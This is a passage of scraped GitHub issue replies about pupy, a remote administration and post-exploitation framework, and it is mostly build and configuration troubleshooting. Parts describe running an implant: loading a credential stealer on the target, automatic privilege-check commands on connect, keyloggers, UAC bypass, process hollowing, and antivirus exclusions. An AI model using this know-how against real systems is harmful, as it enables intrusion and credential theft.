with:\nload_package -r lazagne \nload_package -r LaZagne. > 2.6.32\nNo. It's veeeeeery old. 2 < 4 :)\n\nAfter I successful run command above I still get same error and yeah I just preinstall pupy from Quick install and configure from README.md\n\nThen LaZagne may be not loaded properly. When I have time I'll take a look on how it works with CentOS 6. Meanwhile you can show the output of\npyexec -c 'import lazagne.config.run; print dir(lazagne.config.run)'. Is there any reason why you don't like scramblesuit?\n. https://www.maikel.pro/blog/progress-in-censorship-circumvention-tor-and-pluggable-transports-an-overview/. > Thoughts?\nMy red team experience came from enterprise. And there things are very simple. Egress either explicitly blocked, or fully inspected (i.e. unknown blobs like any custom protocol will be blocked), or there is a hole )\nI never saw anything more complex than that. Any unknown traffic either allowed (because of some kind of hole), or blocked with alerts. Period.\nThis obfs/scramblesuit things works only in environments where egress can not be blocked by default, but owner of the perimeter cares about the content. This likely the case for some countries, but not for small company or enterprise where you are likely working.. \nSo, my thoughts are simple. I don't care about these transports ) They were before I touched this project, so I'm taking care they works. But no more than that.. This doesnt have relation to obfs4.\nDon't use inject. Create regular .exe agent. Add it to AV exceptions manually ( if you use this as legitimate user you can do this). It's ok to modify pexec, but I like to leave shell_exec as is. In all cases :)\nI wrote pexec because shell_exec was dangerous to use, but it's slower. Then I rework shell_exec a bit. In case when amount of output is predictable and short shell_exec is preferable.  For rest cases I usually use interactive_shell.. Well, generally I will agree with this, but to make the testing meaningful the amount of targets platforms a bit more than 2 :(\nWindowses: XP SP2/32 XP SP3/32 7/64 10/64 (always latest build). Installation must be unicode, best is chinise/japanise/russian/arabic or with any other non-latin alphabet. Files/folders/localization should be on that non-latin language.\nLinux: 32/64 with kernels < 2.6.32/<3.2/<3.4/<3.14/<4.9/<4.14/latest. Also there should be distributions with SELinux and AppArmor.\nFor all cases testing should be done with privileged and unprivileged users..\nLooks like horrible amount of work :(\n. > We may be able to automate this after a fashion. Is there something in pupy that can tell if a command succeeded or failed, (i.e. return codes in bash, zero and nonzero)? If so, we can simply have it run through all the general commands and report which ones failed, (i.e. info, persistence, etc). This will not stop the commands from failing at the remote end (for example, message box failing to pop up even though pupy executes it normally on the server), but it can tell us which ones are obviously broken.\nI'm going to think about this, but this will not came fast. Right now PupyCmd was made as thin as possible, so maybe some automation script can be easily embedded there instead in case of testing.\n\nBased on this, I would change the list as follows:\n\nEven small subset will be enough to catch stupid typos and logic bugs. In case of Linux only difference will be in that packages which uses libraries directly. Very small subset. So for basic testing you likely can select two-three distros. Ancient RHEL, like RHEL4, maybe with SELinux and freshest ubuntu, or something like that and any other marginal thing you'll find. . I don't have access to do this. What exactly you are doing?. Well, no, it's just traffic encapsulation (a bit useless at my point of view..).\nAnyway, I checked, and looks like there is regression in obfs3 impl. I'll try to find/fix once I have time. . Sure. Windows version uses hooks/win api, linux - xorg xinput2. One for macos should use their api. Besides keylogger, pupy on Mac is in very early and bad shape. \n1. Native client required, or better extended python version (with support for loading plugins from memory), because python2.7 still there by default.\n2. Basic components should be fixed, like psutil.\nThere is reeealy big amount of work todo, keylogger do have very low priority.. You should install -dev packets\nhttps://github.com/n1nj4sec/pupy/wiki/Installation-(Debian-9). Just follow the instruction from the wiki. Yes, for MacOS there is no prebuilt python bundles for pupy. Also some of libs we use by default are broken at upstream. So it's safe to say that MacOS is in pre-early-alpha-stage :). https://github.com/n1nj4sec/pupy/wiki/Installation-(Debian-9). To compile linux client from sources you need docker. buildenv.sh and build.sh are deprecated and were not updated for a long time.\ncd client; ./build-docker.sh linux64 sources-linux\nWhere - linux64 toolchain name (alxchk/tc-linux64) and sources-linux is folder at client/. You can't. There is no native client for Mac yet, and very unlikely something will change at near future. Yes, it's ok to remove. With time I will check if deps could be compiled to bundles, to make possible to use on target. . Right now there is no validation for these args at pupygen. They goes to payload as is, so in case there are issues with cmdline, there is no way to know this but execute generated payload.\nLooks like for some reason you have garbage in cmdline. Maybe from messages shown by gen command it will be more clear what exactly was embedded to payload to reproduce the bug.. > I was missing the -t argument for the transport options.\n\nWas there a change to make this required? I do not remember needing that flag in the past.\n\nThis was from the early beginning.\n\nAlso, is there a reason pupygen doesn't validate the arguments?\n\nTo make this possible some refactoring should be done first. So it's in todo list, but not on the top. > Would it possible to change the behaviour of the delivering webserver such that it is long-lasting and keeps running in the background\nI already refucktored listeners to works like this in my branch, but didn't put here yet. So, if you are ready to be beta-tester you are welcome :)\nStill I'm a bit skeptical about PS payloads. PS took very big attention now, and with all that AMSI, and size and other things .... For a long time I hadn't situations where it's impossible to upload but possible to execute (I mean whole system either signed or RO).. Yeah.. Right now config is classical ini key-value, without arrays..\nSo you should try something like that:\n```\n[on_connect]\n* = include:default_commands\n[default_commands]\n1 = beroot\n2 = getuid\n```. Ah. The filter there still applied..\nSo \nany_1 = xxxx\nany_2 = yyyy\netc. Yep. There is regression. Unfortunately pure python payload will work only with 2.7.9 < python < 3.\nIf it's possible there - use native client. . > No. Android is broken. The feature does not work.\nWell, it may be broken right now (is it?) but expected to work. Also while pupy with android have limited functionality I test it from time to time (yes, rarely..) and it should work.\n. Looks like connectivity issue. Check your network. This came from latest push. As there was dep on tornado, I move all these ad-hoc servers to one codebase. And yes, now this doesn't work from pupygen. Only from pupysh itself.. You try the version before the merge or after?\nI fixed some issues there during the merge, works for me with Win10.\nBut in my case there were always processes with System. So maybe your case is different.\nCan you show ps or tasklist output (with owners)?\nBTW original code didn't acquire SeDebugPrivilege. Try merged version first. Yes, looks like there are several broken things. I'll fix when have free time. > impossible to scroll back in an interactive shell (very annoying); (regression).\nHi!\nIt sounds very strange. Scrollback is feature of your terminal. What do you use? At least I don't have this with urxvt.\nYou can also try to change shadow_screen = yes in the config to shadow_screen = no\n\nRDP module does not work;\n\nYou mean that which checks creds? \n. Looks like rdp broken because of pyOpenSSL update. Need to find last working version.\nCan you provide some cases for psh/powershell? Screenshots or any way how to reproduce?. Try to update to the latest version. Also try --debug.\nDo not use anything but ssl/ws/rsa transports - for MacOS we don't have neither native client nor support for embedding libs to pure python object. But standard python from MacOS is ok for basic things... Listen: ssl: 443: Insufficient privileges to bind\nYou need either select port > 1024 or use privileged account.\n```\nreadline.write_history_file('.pupy_history')\nIOError: [Errno 13] Permission denied\n\n\n\n\n```\n\n\n\n\nFor some strange reason you don't have access to create/write history file. Well, there are several things why you get things like this.\ncreate-workspace.py itself is wrapper around virtualenv. This thing creates environment with all dependencies at your workspace, /home/roi/pupy/pupyws in your case (./create-workspace.py pupyws). Script also put pupysh wrapper (which calls python with path to environment) somewhere to your's user local dir. When you use sudo, you don't have this for root user. Deps are missing, things goes wrong. I'm not sure, but maybe you had inital error because of cloned repo as root.\nI suggest to do next steps. If you don't need 443 port (you don't), don't run as root.\nCreate workspace somewhere at home directory, like ./create-workspace.sh /home/roi/pupyws.\nEnsure your user can write there (well, I don't see how this may be otherwise).\nExecute pupysh using wrapper script (i.e. pupysh, ensure it's in your PATH).\nYou will have this  [-] Listen: ssl: 443: Insufficient privileges to bind message.\nAfter that execute:\nconfig set listeners ssl 4782 \nconfig save\nrestart\nSection [listeners] has default args for listeners,  this will change port 443 to something else, bigger than 1024.\n. Well, you need to add your user to docker group to be able to communicate with docker. You get those errors because there are no libs like pycryptodome, psutil etc on the rasbian side.\nYou are missing dependencies. Likely at least Cryptodome. Rasbian means ARM? There is no prebuilt client for arm and no pupy toolchain for that. You should compile it by yourself there. If you are running py payload, then you can try to stay with ssl transport only (but honestly I didn't check will it work without prebuild bundles or not).\nSo. You should either build client for ARM, or install python deps there. Likely this will resolve issues.\n. > would be great to have a client compiled, but I'm not that strong at cross compiling...\nIt's very unlikely something exists for python. The only way to do it on x86 likely using qemu. But you can compile this on the target itself. Partially merged. Yes.. Why this should work otherwise?\nYou can add forwarding command on [on_connect] section to restore this on reconnect. If O understand the situation correctly. webserver is for other things. you need to connect to listeners.. You can enable debug log to see where it search config. Best place is workdir/conf/\nPupy uses workdir as project directory. The second option is ~/.config/pupy\n. Looks like you are trying to use keylogger on linux. This will works only if X server is accessible (there is DISPLAY=, authentication cookies found etc) + X server is recent, i.e. has input2 support.. Can you share the information about environment and which things doesn't work?. The horrible thing about PAC is JS sitting inside... No. Will try to port. From your experience what is most common way to publish pac's? LLMNR/DNS/DHCP?. Because to parse PAC first the file should be downloaded. I met PAC only once on windows, where it was placed manually by system administrator. You are welcome to try:\nhttps://github.com/alxchk/pupy/commit/5351203af272c3bba71ef8b156c3ebf58605d632. It is same as here with two exclusions.\n1. Use my repo\n2. You can't use pre-build packages (which are generated from main repo)\n. git clone --recursive https://github.com/alxchk/pupy. https://github.com/n1nj4sec/pupy/blob/unstable/pupy/requirements.txt#L39. M2Crypto issue. By default config searched either in workdir (CWD) or in ~/.config (legacy). There is no way to configure location of config file, but to change this manually in the source code.. XP should work starting from SP2, but yes, some things may be broken. Basic things should work, but not all. At least I have issues with impersonation, fast search, ntfs streams etc.\n\"can_get_admin_access\" issue looks pretty old, at least I don't have this on caac8075\nrelease        XP                                                  \nversion        5.1.2600                                            \nos_arch        x86                                                 \nproc_arch      32bit\nYou can post issues here, but a lot of windows XP can't be fixed without pain. That repo is like dev branch. I'm merging with this one once things works more or less as expected. Also docker images generated from that repo. You are installing something unknown in some strange way, sorry.. Master branch is old and abandonned, don't try to use it. Well, the issue with crpytodome build is not with cpuid.h absence.. \n. https://github.com/n1nj4sec/pupy/wiki/Installation. https://github.com/n1nj4sec/pupy/wiki/Installation. This may be possible, if wes will support python2 and will behave like module. I made pull request - https://github.com/bitsadmin/wesng/pull/21\nLet's see... This is a bug, which I will fix. But use gen from pupysh anyway. Direct pupygen call is a bit obsolete for now. Well, something strange here. Can you try master from alxchk/pupy?\nAlso, please enable traceback:\n> pyexec -c 'import sys;  sys.tracebacklimit=20'\nand pupysh loggging\n>logging info\nAlso try on fresh loaded client. Invoke just\n> shell\nIn case you are building bundle and clients manualy, ensure you rebuild all the things from scratch\n. > compiled the payload templates via docker\nThis is not related to the issue, but be sure to update tc-windows (i.e. delete build-pupy-windows container, then pull alxchk/tc-windows).\n\nSometimes the failed attempt would result in an error flashing in the console (pupysh). I managed to screenshot: https://imgur.com/a/7fllY3e\n\nWell, this is another story.\nInteractive shell works like this.  cmd.exe started, then WinPTY agent injected there, then pupy client establish connection to the agent using named pipes. WinPTY injected using hollowing. Hollowing implementation is not perfect (actually it's buggy and ugly). \nIn your case something went wrong during memory manipulation. Rigtht now I don't export exact errors from the library, so it's hard to find out what exactly failed.\nYou can try to duplicate or migrate module after bypassuac, it may work then.\nAlso, what is the system and bypassuac method?. What bothers me, according to your screenshot there is some issue likely with hollowing which results in corrupted image... Reproduced, will try to figure out what is there. Well, it turns out to be a hard thing. Looks like ntdll loader behaves differently in this scenario. And I can't debug what is different =. https://github.com/n1nj4sec/pupy/wiki/Installation. This variable is module local. In case module updated thread will leak. If you want to have background searches then use Tasks please. If you find them not so perfect you may improve them.\nExamples:\nhttps://github.com/alxchk/pupy/blob/unstable/pupy/packages/linux/all/keylogger.py#L544\nhttps://github.com/alxchk/pupy/blob/unstable/pupy/packages/linux/all/usniper.py#L14\nhttps://github.com/alxchk/pupy/blob/unstable/pupy/packages/posix/all/hashmon.py#L38\nhttps://github.com/alxchk/pupy/blob/unstable/pupy/packages/all/pupyutils/netcreds.py#L97\nThe idea is this object preserves result in some standard way, so you can acquire data with same API. Also this thing try to preserve results during shutdown (well, not always possible). ",
    "aiddenkeli": "Sorry yes on android. I will start looking at writing a module for it but I am not very skilled. If anyone who sees this would like this ability I humbly request they write a module and submit a pull request. If I get a module working I will do the same but I make no promises on quality. Thanks!\n. ",
    "NeverMine17": "@MagicInventor, @quentinhardy, I think you don't get it. He wants to check for root before running su.\n@aiddenkeli, You should see this StackOverflow question. Hope its helps.\n\nIs there a way to 'su' to root if the device is already rooted?\n\nAlso it would be great if someone makes module that could use that feature.\nFor example a module that can dump Wi-Fi passwords.\nThis repository should help: https://github.com/Viralmaniar/Wifi-Dumper. And? There is no comment on that issue what so ever.. Yes. Ok. Maybe you can do it like that --host ip1,ip2,ip3 ?. Try to retry update. There is might be something with your internet connection. Have you tried checking your settings?. Im talking about your system settings, like proxy. Maybe its something with your PC.. Just tried git submodule update. Everything is fine.. ",
    "fljxnbfz27": "Thank you for the quick reply. \nI think that is probably the issue since the actual pp.py I used was an older version, I updated to the latest server, but the client remained the older version.\nI will give it a try and let you know. \n. I used the latest version of Pupy and re-did the setup. \nThe issue still occurs regardless that both client and server are latest. Both my server and clients are Linux machines. \nSince you mentioned Python 2.7.11, I noticed my server is running 2.7.9, I fully upgraded to 2.7.11 on my server and the issue still remains regardless.\n```\nClient (Kali):\nLinux CLIENT 4.4.0-kali1-amd64 #1 SMP Debian 4.4.6-1kali1 (2016-03-18) x86_64 GNU/Linux\nServer (Debian 8):\nLinux SERVER 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64 GNU/Linux\n```\nSame error more or less with a bit more details: \nINFO:root:connecting to 6.7.8.9:53 using transport tcp_ssl ...\nINFO:root:using client options: {}\nINFO:root:using transports options: {}\nERROR:root:Traceback (most recent call last):\n  File \"<string>\", line 193, in rpyc_loop\n  File \"<memimport>\\network\\launchers\\simple.py\", line 46, in iterate\n  File \"<memimport>\\network\\clients.py\", line 99, in connect\n  File \"/usr/lib/python2.7/ssl.py\", line 929, in wrap_socket\n    ciphers=ciphers)\n  File \"/usr/lib/python2.7/ssl.py\", line 597, in __init__\n    self.do_handshake()\n  File \"/usr/lib/python2.7/ssl.py\", line 826, in do_handshake\n    self._sslobj.do_handshake()\nSSLError: ('_ssl.c:574: The handshake operation timed out',)\nI am not sure if you mean restarting the actual Linux server or just Pupy when you mentioned a restart, I haven't done a server restart only a pupysh restart. \nAny ideas?\n. I updated to OpenSSL 1.0.2h  3 May 2016 and restarted just now, but no luck. Same issue remains. \n. ",
    "ETeissonniere": "@n1nj4sec will test, unfortunately I do not have access my win 8 computer ATM.\n- why did you close it?\n. @n1nj4sec that's okay I can understand :smile:\nIf you review the code, you will see there is no backdoor :smirk: but I\nthink it is a good things to take precautions...\n. @void-in or you can load a LKM root kit which will hide pupy :smile:\n. Nice!\n. ",
    "guistory": "ImportError: No module named external.creddump7.framework.addrspace\ni instead it with true path \uff0cbut error like above\u3002\n. ",
    "jboss38": "Keylogger not working for Android atm :). Oh thx for the info i added the binaires but i still have the same kind of error \not@kali:/home/kali/pupy/pupy-master/pupy# python pupygen.post 192.168.1.150:444\n[+] generating payload ...\n[+] packaging the apk ... (can take 10-20 seconds)\n/bin/sh: 1: jarsigner: not found\nTraceback (most recent call last):\n  File \"pupygen.py\", line 415, in \n    get_edit_apk(os.path.join(ROOT, \"payload_templates\",\"pupy.apk\"), outpath, conf)\n  File \"pupygen.py\", line 222, in get_edit_apk\n    res=subprocess.check_output(\"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword '%s' pupy_key\"%new_path, shell=True)\n  File \"/usr/lib/python2.7/subprocess.py\", line 573, in check_output\n    raise CalledProcessError(retcode, cmd, output=output)\nsubprocess.CalledProcessError: Command 'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword 'pupy.apk' pupy_key' returned non-zero exit status 127\nroot@kali:/home/kali/pupy/pupy-master/pupy#\nI noticed that you dont see my cmd synthax correctly but its the same has you give me :) \nI tried to install openjdk-8-jdk but kali didnt find the paquets, wrong syntax ? . Fixed with \napt-get install openjdk-7-jdk \nOn kali nethunter. . The phone was in the air.\nThere is no minimum Android required ? This fonction work on every Android ? With All model ? . Hum cannot do it work with 5.1.1 Android with CM 12 on OnePlus one with kali nethunter Installed. \nI mean he take screen but it always Black (phone not on table) \nAnd still nothing happening with text to speech also\nEDIT: i manage to take a snap (don't know how, maybe front cam working)\nhttps://transfer.sh/JsH9q/snap.zip\nThe picture is really small btw. Perfect. \nHave a Nice Day ! . Thanks for sharing, look very cool to me. \nJust a ramdom question;\nThere is a limit at saving at memory ? \nOr the data grow until the device get a overflow and crash ? \n. Yes i think adding a args to enable or not the 'save to file' could be nice. \nLike this, even If the device reboot you can keep tracking for multiples days. . :+1: \nNice one mate ;). Dude,  nothing is wrong, This output mean that the compilation is a succes. \n. This is not a pupy issues, you will have better chance to resolve this on kali forums.. . Github doesn't have a private message feature so i post here.\nDo you think you could add a Android pattern lock decode ?\nExample : https://github.com/sch3m4/androidpatternlock\nI'm not sure if we can do this without root, do you know ? . Okey i was thinking same. \nwell maybe you can add in your get_info module :\nIs it root ? Yes or No. Did u follow those step :\ngit clone https://github.com/n1nj4sec/pupy.git pupy\ncd pupy\ngit submodule init\ngit submodule update\npip install -r requirements.txt. I think it because LaZagne pushed New commit. \nMaybe you can try install LaZagne by your own. Working good for me. \nOn 5.1.1 Android. \nWhat's ur Android version ? . i made it with ubuntu 16.04 this can be close.. To build source payload for Windows on Kali you need wine && vcpp\nhttps://github.com/n1nj4sec/pupy/wiki/Build-payloads-from-sources. Nice m8. I renamed the package name to androidsys. \nHere cat log :\n03-14 16:26:50.368 I/Timeline(1672): Timeline: Activity_launch_request id:org.androidsys.android time:216378845\n03-14 16:26:50.369 I/ActivityManager(802): START u0 {act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] flg=0x10200000 cmp=org.androidsys.android/org.renpy.android.PythonActivity (has extras)} from uid 10066 on display 0\n03-14 16:26:50.373 V/WindowManager(802): addAppToken: AppWindowToken{3117627f token=Token{11e3179e ActivityRecord{36ec01d9 u0 org.androidsys.android/org.renpy.android.PythonActivity t978}}} to stack=1 task=978 at 0\n03-14 16:26:50.386 V/WindowManager(802): Adding window Window{2d561ee4 u0 Starting org.androidsys.android} at 15 of 20 (after Window{752fcea u0 com.nolanlawson.logcat/com.nolanlawson.logcat.LogcatActivity})\n03-14 16:26:50.413 I/ActivityManager(802): Start proc 17409:org.androidsys.android:python/u0a152 for activity org.androidsys.android/org.renpy.android.PythonActivity\n03-14 16:26:50.528 E/art     (17409): dlopen(\"/data/data/org.androidsys.android/files/lib/python2.7/lib-dynload/_sqlite3.so\", RTLD_LAZY) failed: dlopen failed: library \"/data/data/org.androidsys.android/files/lib/python2.7/lib-dynload/_sqlite3.so\" not found\n03-14 16:26:50.528 E/art     (17409): dlopen(\"/data/data/org.androidsys.android/files/lib/python2.7/lib-dynload/_imaging.so\", RTLD_LAZY) failed: dlopen failed: library \"/data/data/org.androidsys.android/files/lib/python2.7/lib-dynload/_imaging.so\" not found\n03-14 16:26:50.544 V/WindowManager(802): Adding window Window{1752a44e u0 org.androidsys.android/org.renpy.android.PythonActivity} at 15 of 21 (before Window{2d561ee4 u0 Starting org.androidsys.android})\n03-14 16:26:50.606 I/ActivityManager(802): Displayed org.androidsys.android/org.renpy.android.PythonActivity: +213ms\n03-14 16:26:50.886 I/Timeline(802): Timeline: Activity_windows_visible id: ActivityRecord{36ec01d9 u0 org.androidsys.android/org.renpy.android.PythonActivity t978} time:216379363\n03-14 16:26:52.157 W/PackageManager(1237): Failure retrieving resources for org.androidsys.android: Resource ID #0x0\n03-14 16:26:53.194 W/PackageManager(1237): Failure retrieving resources for org.androidsys.android: Resource ID #0x0. Same if i edit just the app name without touch package name or logo\n03-14 16:38:40.519 I/Timeline(1672): Timeline: Activity_launch_request id:org.pupy.android time:217088996\n03-14 16:38:40.520 I/ActivityManager(802): START u0 {act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] flg=0x10200000 cmp=org.pupy.android/org.renpy.android.PythonActivity (has extras)} from uid 10066 on display 0\n03-14 16:38:40.526 V/WindowManager(802): addAppToken: AppWindowToken{21997c99 token=Token{2bf741e0 ActivityRecord{295d43e3 u0 org.pupy.android/org.renpy.android.PythonActivity t999}}} to stack=1 task=999 at 0\n03-14 16:38:40.545 V/WindowManager(802): Adding window Window{6dcf836 u0 Starting org.pupy.android} at 4 of 9 (after Window{1ca89afe u0 com.nolanlawson.logcat/com.nolanlawson.logcat.LogcatActivity})\n03-14 16:38:40.574 I/ActivityManager(802): Start proc 21547:org.pupy.android:python/u0a155 for activity org.pupy.android/org.renpy.android.PythonActivity\n03-14 16:38:40.670 E/art     (21547): dlopen(\"/data/data/org.pupy.android/files/lib/python2.7/lib-dynload/_sqlite3.so\", RTLD_LAZY) failed: dlopen failed: library \"/data/data/org.pupy.android/files/lib/python2.7/lib-dynload/_sqlite3.so\" not found\n03-14 16:38:40.671 E/art     (21547): dlopen(\"/data/data/org.pupy.android/files/lib/python2.7/lib-dynload/_imaging.so\", RTLD_LAZY) failed: dlopen failed: library \"/data/data/org.pupy.android/files/lib/python2.7/lib-dynload/_imaging.so\" not found\n03-14 16:38:40.686 V/WindowManager(802): Adding window Window{17cee310 u0 org.pupy.android/org.renpy.android.PythonActivity} at 4 of 10 (before Window{6dcf836 u0 Starting org.pupy.android})\n03-14 16:38:40.746 I/ActivityManager(802): Displayed org.pupy.android/org.renpy.android.PythonActivity: +205ms\n03-14 16:38:41.042 I/Timeline(802): Timeline: Activity_windows_visible id: ActivityRecord{295d43e3 u0 org.pupy.android/org.renpy.android.PythonActivity t999} time:217089519\n03-14 16:38:43.969 W/PackageManager(1237): Failure retrieving resources for org.pupy.android: Resource ID #0x0\n. Did i miss somethings when compiling ? \nCuz there is no error when generate the payload. Look All ok but i dont find why Its not working :/\n. Cannot find any working solution to the .so missing resource on the web atm\nIs this can be the cause ? : https://github.com/kivy/python-for-android/issues/925. Look better than nothing to me. \nThx. https://developer.apple.com/library/content/documentation/IDEs/Conceptual/iOS_Simulator_Guide/TestingontheiOSSimulator/TestingontheiOSSimulator.html\nGood Luck ! . @alxchk \nJust tested got a error too:\n```\n[INFO]:    -> running autogen.sh\nException in thread background thread for pid 12170:\nTraceback (most recent call last):\n  File \"/usr/lib/python2.7/threading.py\", line 801, in __bootstrap_inner\n    self.run()\n  File \"/usr/lib/python2.7/threading.py\", line 754, in run\n    self.__target(self.__args, *self.__kwargs)\n  File \"/usr/local/lib/python2.7/dist-packages/sh.py\", line 2170, in background_thread\n    handle_exit_code(exit_code)\n  File \"/usr/local/lib/python2.7/dist-packages/sh.py\", line 1929, in fn\n    return self.command.handle_command_exit_code(exit_code)\n  File \"/usr/local/lib/python2.7/dist-packages/sh.py\", line 672, in handle_command_exit_code\n    raise exc\nErrorReturnCode_127:\nRAN: ./autogen.sh\nSTDOUT:\n./autogen.sh: 2: exec: autoreconf: not found\nSTDERR:\nTraceback (most recent call last):\n  File \"/usr/lib/python2.7/runpy.py\", line 174, in run_module_as_main\n    \"main\", fname, loader, pkg_name)\n  File \"/usr/lib/python2.7/runpy.py\", line 72, in _run_code\n    exec code in run_globals\n  File \"/root/Documents/Pupy2/client/android_sources/python-for-android/pythonforandroid/toolchain.py\", line 943, in \n    main()\n  File \"/root/Documents/Pupy2/client/android_sources/python-for-android/pythonforandroid/toolchain.py\", line 940, in main\n    ToolchainCL()\n  File \"/root/Documents/Pupy2/client/android_sources/python-for-android/pythonforandroid/toolchain.py\", line 508, in init\n    getattr(self, args.subparser_name.replace('-', ''))(args)\n  File \"/root/Documents/Pupy2/client/android_sources/python-for-android/pythonforandroid/toolchain.py\", line 147, in wrapper_func\n    build_dist_from_args(ctx, dist, args)\n  File \"/root/Documents/Pupy2/client/android_sources/python-for-android/pythonforandroid/toolchain.py\", line 190, in build_dist_from_args\n    build_recipes(build_order, python_modules, ctx)\n  File \"pythonforandroid/build.py\", line 565, in build_recipes\n  File \"/root/Documents/Pupy2/client/android_sources/python-for-android/pythonforandroid/recipes/libffi/init.py\", line 42, in build_arch\n    shprint(sh.Command('./autogen.sh'), _env=env)\n  File \"pythonforandroid/logger.py\", line 175, in shprint\n  File \"/usr/local/lib/python2.7/dist-packages/sh.py\", line 720, in next\n    self.wait()\n  File \"/usr/local/lib/python2.7/dist-packages/sh.py\", line 651, in wait\n    self.handle_command_exit_code(exit_code)\n  File \"/usr/local/lib/python2.7/dist-packages/sh.py\", line 672, in handle_command_exit_code\n    raise exc\nsh.ErrorReturnCode_127:\nRAN: ./autogen.sh\nSTDOUT:\n./autogen.sh: 2: exec: autoreconf: not found\nSTDERR:\nCommand failed: /usr/bin/python -m pythonforandroid.toolchain create --dist_name=pupy --bootstrap=badservice --requirements=pycrypto,plyer,psutil,tinyec,netaddr,rpyc,pyjnius,pyuv,cryptography --arch armeabi-v7a --copy-libs --local-recipes /root/Documents/Pupy2/client/android_sources/python-for-android/pythonforandroid/recipes --color=always --storage-dir=/root/Documents/Pupy2/client/android_sources/.buildozer/android/platform/build\n\n``. @alxchk \nbuild-essential was already installed.\ni fixed this error installing autoreconf withapt-get install dh-autoreconf`\nNow its fail at : \n```\n[DEBUG]:   -> running cp /root/Documents/pupy/client/android_sources/.buildozer/android/platform/build/dists/pupy/bin/Android-0.1-release-unsigned.apk ./\nTraceback (most recent call last):\n  File \"/usr/local/bin/buildozer\", line 11, in \n    load_entry_point('buildozer==0.34.dev0', 'console_scripts', 'buildozer')()\n  File \"/root/.local/lib/python2.7/site-packages/buildozer/scripts/client.py\", line 13, in main\n    Buildozer().run_command(sys.argv[1:])\n  File \"/root/.local/lib/python2.7/site-packages/buildozer/init.py\", line 1058, in run_command\n    self.target.run_commands(args)\n  File \"/root/.local/lib/python2.7/site-packages/buildozer/target.py\", line 91, in run_commands\n    func(args)\n  File \"/root/.local/lib/python2.7/site-packages/buildozer/target.py\", line 139, in cmd_release\n    self.buildozer.build()\n  File \"/root/.local/lib/python2.7/site-packages/buildozer/init.py\", line 212, in build\n    self.target.build_package()\n  File \"/root/.local/lib/python2.7/site-packages/buildozer/targets/android.py\", line 808, in build_package\n    copyfile(join(apk_dir, apk), join(self.buildozer.bin_dir, apk_dest))\n  File \"/usr/lib/python2.7/shutil.py\", line 82, in copyfile\n    with open(src, 'rb') as fsrc:\nIOError: [Errno 2] No such file or directory: u'/root/Documents/pupy/client/android_sources/.buildozer/android/platform/build/dists/pupy/bin/Wi-Fi-0.1-release.apk'\n```\nEDIT : Here is the ls of the folder bin:\ndrwxr-xr-x  7 root root    4096 mai   30 22:55 .\ndrwxr-xr-x 15 root root    4096 mai   30 22:55 ..\n-rw-r--r--  1 root root 5859493 mai   30 22:54 Android-0.1.ap_\n-rw-r--r--  1 root root     955 mai   30 22:54 Android-0.1.ap_.d\n-rw-r--r--  1 root root 8188641 mai   30 22:54 Android-0.1-release-unsigned.apk\n-rw-r--r--  1 root root     960 mai   30 22:54 Android-0.1-release-unsigned.apk.d\n-rw-r--r--  1 root root    5352 mai   30 22:55 AndroidManifest.xml\n-rw-r--r--  1 root root     228 mai   30 22:55 AndroidManifest.xml.d\n-rw-r--r--  1 root root     183 mai   30 22:55 build.prop\ndrwxr-xr-x  3 root root    4096 mai   30 22:53 classes\n-rw-r--r--  1 root root   35172 mai   30 22:55 classes.dex\n-rw-r--r--  1 root root    3873 mai   30 22:55 classes.dex.d\ndrwxr-xr-x  2 root root    4096 mai   30 22:53 dexedLibs\n-rw-r--r--  1 root root     403 mai   30 22:55 proguard.txt\ndrwxr-xr-x  3 root root    4096 mai   30 22:53 res\ndrwxr-xr-x  2 root root    4096 mai   30 22:54 rsLibs\ndrwxr-xr-x  2 root root    4096 mai   30 22:54 rsObj\n-rw-r--r--  1 root root 5859511 mai   30 22:55 Wi-Fi-0.1.ap_\n-rw-r--r--  1 root root     953 mai   30 22:55 Wi-Fi-0.1.ap_.d\n-rw-r--r--  1 root root     956 mai   30 22:55 Wi-Fi-0.1-release-unsigned.apk.d\nSo look like buildozer command PASS, but name it \"Wi-Fi-0.1-release-unsigned.apk.d\" instead of \"Wi-Fi-0.1-release-unsigned.apk\". @alxchk \nSo sould i rename \"Wi-Fi-0.1-release-unsigned.apk\" in \"Android-0.1-release-unsigned.apk\" in the sciprt named build.sh ? (for future build). ",
    "mnogostuff": "That's perfect! Thank you, I was pretty sure it was my mistake.\n. ",
    "EchoNine": "Thanks for answering. i meant git clone ..\n. actually no, but never mind .. Thx anyway\n. ",
    "mekasama": "Hi,\nThanks for your attention.\nI'm using pupy every day and its important for me that the payload generated be in a low size, but .PS1 payload is 19 MB. this size is very big for general payloads. in other hand when this type of payload convert to an other file format make it bigger!\n. ",
    "dromero1452": "When compiling the apk I get the preceding error, I trying gen new keys,\nfollow installation to a tee, although I finally figured out the issue, btw\na fantastic tool, just possibly needs a more in depth tutorial, once I get\na little free time I could perhaps help with writing this up and submit it\nto you for review\nOn Jul 27, 2016 10:42 AM, \"n1nj4sec\" notifications@github.com wrote:\n\nNevermind, 2042 is the end of the world. What is the relation with the\nissue's title ?\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/n1nj4sec/pupy/issues/139#issuecomment-235626897, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/AQP5ym-Gl2A-RNoy4OpJfyE5tPPlZIkbks5qZ3xPgaJpZM4JWSwg\n.\n. \n",
    "b3mb4m": "XP outdated.\n. ",
    "sempervictus": "Hello, thanks for the quick response. I see the project attributions in the LICENSE files, though what i was thinking of was more of a mailmap so that users could more easily contact original authors when assistance is required or they need to find a resource for something related. This request stems from an email i received this morning relating the in-memory exe overwrite code. Glad the user was able to find me, but figure it may be beneficial to have a mailmap or other reference available. It seems i placed my contact information in the sources, but that's actually quite rare, and  makes me think i should start doing that as a habit so i dont leave half-baked code out there for someone to get frustrated with without recourse :).\nPupy is structured very differently from Framework, where we have modules which carry author attribution directly in them. I personally mostly work in the /lib subtree in MSF so go off of commit history with clients or if i need to find an adjacent author working on the same namespace. \nAnyway, just a suggestion for consideration, not a pressing issue by any means.\nNice tool by the way, well thought out, and highly mutable. Thanks for the hard work on it.\n. ",
